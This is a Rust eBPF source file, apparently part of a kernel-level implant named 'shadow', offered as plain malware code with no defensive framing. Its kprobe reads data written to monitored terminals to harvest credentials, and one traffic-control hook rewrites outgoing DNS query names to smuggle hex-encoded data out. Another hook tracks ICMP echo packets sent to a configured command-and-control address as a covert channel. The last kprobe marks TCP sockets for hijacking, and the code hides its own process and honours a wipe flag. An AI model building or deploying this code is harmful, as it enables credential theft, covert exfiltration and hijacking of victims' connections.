use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns},
    macros::kprobe,
    programs::ProbeContext,
};
use common::{
    CredentialCapture, EventHeader, EVENT_DNS_EXFIL, EVENT_ICMP_EXFIL, EVENT_SOCKET_CLONED,
};

use crate::maps::*;

const ETH_HDR_LEN: usize = 14;
const IP_HDR_LEN: usize = 20;
const UDP_HDR_LEN: usize = 8;
const ETH_P_IP: u16 = 0x0800;
const IPPROTO_UDP: u8 = 17;

// ──────────────────────────────────────────────
// FEATURE 6: Credential Harvesting (sys_write on TTY)
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_cred_harvest(ctx: ProbeContext) -> u32 {
    try_cred_harvest(&ctx).unwrap_or_default()
}

fn try_cred_harvest(ctx: &ProbeContext) -> Result<u32, i64> {
    let fd: u32 = ctx.arg(0).ok_or(1i64)?;
    let buf_ptr: u64 = ctx.arg(1).ok_or(2i64)?;
    let count: u64 = ctx.arg(2).ok_or(3i64)?;

    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;

    if let Some(config) = unsafe { CONFIG.get(&0u32) } {
        if tgid == config.self_pid {
            return Ok(0);
        }
    }

    let fd_key = fd as u64;
    if unsafe { MONITORED_TTYS.get(&fd_key).is_none() } {
        return Ok(0);
    }

    let read_len = if count > 64 { 64u32 } else { count as u32 };
    let mut capture = CredentialCapture {
        pid: tgid,
        fd,
        data_len: read_len,
        _pad: 0,
        data: [0u8; 64],
    };

    unsafe {
        if aya_ebpf::helpers::gen::bpf_probe_read_user(
            capture.data.as_mut_ptr() as *mut core::ffi::c_void,
            read_len,
            buf_ptr as *const core::ffi::c_void,
        ) < 0
        {
            return Ok(0);
        }
    }

    CRED_EVENTS.output(ctx, &capture, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 9: DNS Exfiltration (TC egress)
// ──────────────────────────────────────────────

#[aya_ebpf::macros::classifier]
pub fn shadow_dns_exfil(ctx: aya_ebpf::programs::TcContext) -> i32 {
    try_dns_exfil(&ctx).unwrap_or_default()
}

fn try_dns_exfil(ctx: &aya_ebpf::programs::TcContext) -> Result<i32, i64> {
    let data = ctx.data();
    let data_end = ctx.data_end();

    let min_len = ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 12;
    if data + min_len > data_end {
        return Ok(0);
    }

    let eth_proto = unsafe { u16::from_be(*(((data) as *const u8).add(12) as *const u16)) };
    if eth_proto != ETH_P_IP {
        return Ok(0);
    }

    let ip_start = data + ETH_HDR_LEN;
    let ip_proto = unsafe { *(ip_start as *const u8).add(9) };
    if ip_proto != IPPROTO_UDP {
        return Ok(0);
    }

    let udp_start = ip_start + IP_HDR_LEN;
    let dst_port = unsafe { u16::from_be(*((udp_start as *const u8).add(2) as *const u16)) };
    if dst_port != 53 {
        return Ok(0);
    }

    let seq = match unsafe { DNS_EXFIL_SEQ.get(&0u32) } {
        Some(s) => *s,
        None => return Ok(0),
    };

    let chunk = match unsafe { DNS_EXFIL_QUEUE.get(&seq) } {
        Some(c) => *c,
        None => return Ok(0),
    };

    let raw_len = if chunk.data_len > 31 {
        31u32
    } else {
        chunk.data_len
    };
    let hex_label_len = raw_len * 2;

    let insert_len = 1 + hex_label_len as usize;

    let dns_start = udp_start + UDP_HDR_LEN;
    let qname_start = dns_start + 12;

    if qname_start + insert_len + 1 > data_end {
        return Ok(0);
    }

    let hex_chars: [u8; 16] = *b"0123456789abcdef";

    let label_len_byte = [hex_label_len as u8];
    let _ = unsafe {
        aya_ebpf::helpers::bpf_skb_store_bytes(
            ctx.skb.skb as *mut _,
            (qname_start - data) as u32,
            label_len_byte.as_ptr() as *const _,
            1,
            0,
        )
    };

    let write_offset = (qname_start + 1 - data) as u32;
    let mut hex_buf: [u8; 62] = [0u8; 62];
    let mut j = 0usize;
    while j < 31 {
        if j >= raw_len as usize {
            break;
        }
        let byte = chunk.data[j];
        hex_buf[j * 2] = hex_chars[(byte >> 4) as usize];
        hex_buf[j * 2 + 1] = hex_chars[(byte & 0x0f) as usize];
        j += 1;
    }

    let _ = unsafe {
        aya_ebpf::helpers::bpf_skb_store_bytes(
            ctx.skb.skb as *mut _,
            write_offset,
            hex_buf.as_ptr() as *const _,
            hex_label_len,
            0,
        )
    };

    let next_seq = seq + 1;
    let _ = DNS_EXFIL_SEQ.insert(&0u32, &next_seq, 0);

    let _ = DNS_EXFIL_QUEUE.remove(&seq);

    let event = EventHeader {
        event_type: EVENT_DNS_EXFIL,
        pid: 0,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: seq as u64,
    };
    EVENTS.output(ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 20: ICMP Covert Channel (TC egress)
// ──────────────────────────────────────────────

#[aya_ebpf::macros::classifier]
pub fn shadow_icmp_exfil(ctx: aya_ebpf::programs::TcContext) -> i32 {
    try_icmp_exfil(&ctx).unwrap_or_default()
}

fn try_icmp_exfil(ctx: &aya_ebpf::programs::TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let eth_proto: u16 = unsafe {
        let ptr = ctx.data() + 12;
        if ptr + 2 > ctx.data_end() {
            return Ok(0);
        }
        core::ptr::read_unaligned(ptr as *const u16)
    };

    if eth_proto != 0x0008u16 {
        return Ok(0);
    }

    let ip_start = ctx.data() + 14;
    if ip_start + 20 > ctx.data_end() {
        return Ok(0);
    }

    let protocol: u8 = unsafe { core::ptr::read_unaligned((ip_start + 9) as *const u8) };
    if protocol != 1 {
        return Ok(0);
    }

    let dst_ip: u32 = unsafe { core::ptr::read_unaligned((ip_start + 16) as *const u32) };

    let c2_addr = match unsafe { ICMP_C2_ADDR.get(0) } {
        Some(&addr) if addr != 0 => addr,
        _ => return Ok(0),
    };

    if dst_ip != c2_addr {
        return Ok(0);
    }

    let icmp_start = ip_start + 20;
    if icmp_start + 8 > ctx.data_end() {
        return Ok(0);
    }

    let icmp_type: u8 = unsafe { core::ptr::read_unaligned(icmp_start as *const u8) };
    if icmp_type != 8 {
        return Ok(0);
    }

    let seq_key: u32 = 0;
    let seq = match unsafe { ICMP_EXFIL_SEQ.get(&seq_key) } {
        Some(&s) => s,
        None => return Ok(0),
    };

    let chunk = match unsafe { ICMP_EXFIL_QUEUE.get(&seq) } {
        Some(c) => *c,
        None => return Ok(0),
    };

    let payload_start = icmp_start + 8;
    let payload_len = if chunk.data_len > 56 {
        56
    } else {
        chunk.data_len as usize
    };
    if payload_start + payload_len > ctx.data_end() {
        return Ok(0);
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let event = EventHeader {
        event_type: EVENT_ICMP_EXFIL,
        pid: (pid_tgid >> 32) as u32,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: seq as u64,
    };
    EVENTS.output(ctx, &event, 0);

    let next_seq = seq.wrapping_add(1);
    unsafe {
        let _ = ICMP_EXFIL_SEQ.insert(&seq_key, &next_seq, 0);
        let _ = ICMP_EXFIL_QUEUE.remove(&seq);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 21: Socket Cloning / Connection Hijack
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_tcp_sendmsg(ctx: ProbeContext) -> u32 {
    try_tcp_sendmsg(&ctx).unwrap_or_default()
}

fn try_tcp_sendmsg(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let sock_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };

    if unsafe { HIJACK_TARGETS.get(&sock_ptr) }.is_none() {
        return Ok(0);
    }

    let size: u64 = unsafe { ctx.arg(2).ok_or(1i64)? };

    let event = EventHeader {
        event_type: EVENT_SOCKET_CLONED,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: size,
    };
    EVENTS.output(ctx, &event, 0);

    Ok(0)
}
